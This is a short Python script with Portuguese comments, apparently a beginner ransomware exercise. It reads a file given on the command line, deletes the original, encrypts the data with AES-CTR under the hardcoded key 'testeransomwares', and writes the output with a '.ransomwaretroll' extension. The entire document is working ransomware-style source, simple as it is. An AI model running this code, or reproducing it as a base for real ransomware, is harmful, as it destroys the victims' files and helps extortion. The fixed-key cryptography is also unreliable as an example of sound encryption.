import os
import sys
import pyaes

## abrir o arquivo a ser criptografado
if len(sys.argv) != 2:
    print("Uso: python encrypt.py <arquivo>")
    sys.exit(1)

file_name = sys.argv[1]

if not os.path.isfile(file_name):
    print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
    sys.exit(1)

with open(file_name, "rb") as file:
    file_data = file.read()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
